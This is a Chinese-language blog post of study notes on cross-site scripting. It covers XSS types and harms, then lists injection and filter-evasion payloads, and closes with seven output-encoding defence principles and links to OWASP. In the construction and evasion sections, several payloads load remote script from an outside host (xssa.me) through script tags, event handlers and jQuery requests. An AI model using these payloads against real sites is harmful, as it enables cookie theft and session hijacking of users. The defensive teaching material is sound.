---
title: XSS - 笔记整理
date: 2017-08-31 18:21:02
tags: Web
---

>   XSS(Cross Site Scripting)

>   用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。

### XSS的分类
- 反射型XSS
- 持久型XSS
- DOM-based型XSS（客户端注入）
<!-- more -->

### XSS的危害
- Cookie资料窃取
- 劫持用户会话
- 广告弹窗
- 网页挂马
- 网站钓鱼
- 按键记录
- ...(JS能完成的任何功能)

### XSS的构造
- ##### 利用<>标记注入HTML/JavaScript标签
```
    <script>alert(1)</script>

    <sCRiPt sRC=http://xssa.me/EXgq></sCrIpT>
```

- ##### 利用HTML标签属性值执行XSS
```
    <a href="javascript:alert(1)">click me</a>

    ...除href/src外的其它类似属性
```

- ##### 在HTML标签中注入事件
```
    <img src=x onerror="javascript:alert(/XSS/)">

    <img src=logo.png onload=s=createElement('script');body.appendChild(s);s.src='http://xssa.me/EXgq';>

    <input onfocus=a='scr';s=createElement(a+'ipt');body.appendChild(s);s.src='http://xssa.me/EXgq'; autofocus>
    
    ...各种on事件
```

- ##### 利用CSS跨站
>   尝试多种样式表(css),均无效。原因未知

### XSS的变形
```
    <sCRiPt/SrC=//xssa.me/EXgq>

    <ScRiPt/**/src=http://xssa.me/EXgq></ScRiPt>

    <img src=1 onerror=$.get('http://xssa.me/EXgq')>      (jquery)

    eval($.get('http://xssa.me/EXgq'))            (jquery)

    <svg/onload=document.body.appendChild(document.createElement(/script/.source)).src='http://xssa.me/EXgq'
```

### XSS的防御

原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码

原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码

**HTML Entity编码**
```
&     –>     &amp;
<     –>     &lt;
>     –>     &gt;
”     –>     &quot;
‘     –>     &#x27;
/     –>     &#x2f;
```
原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码
>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）

>   之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。

>   除了空格符可以闭合当前属性外，这些符号也可以：
%     *     +     ,     –     /     ;     <     =     >     ^     |     `(反单引号，IE会认为它是单引号)


原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码
>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \xHH （以 \x 开头，HH则是指该字符对应的十六进制数字

>   在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。

原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码
>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \HH （以 \ 开头，HH则是指该字符对应的十六进制数字）

原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码
>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）
>   在对URL进行编码的时候，有两点是需要特别注意的：
>   1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码
>   2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。

原则7：使用富文本时，使用XSS规则引擎进行编码过滤
>   针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如 b, i, p等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在div, p等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到SCRIPT标签里。

### XSS Cheat Sheet
[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)

### 参考资料
- 《XSS跨站脚本 攻击剖析与防御》[PDF 百度云](https://pan.baidu.com/s/1cwDUhg) (PS:书写的很一般，没必要买实体书，虽说我买了。)
- [防御XSS的七条原则](http://www.freebuf.com/articles/web/9977.html)
- [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)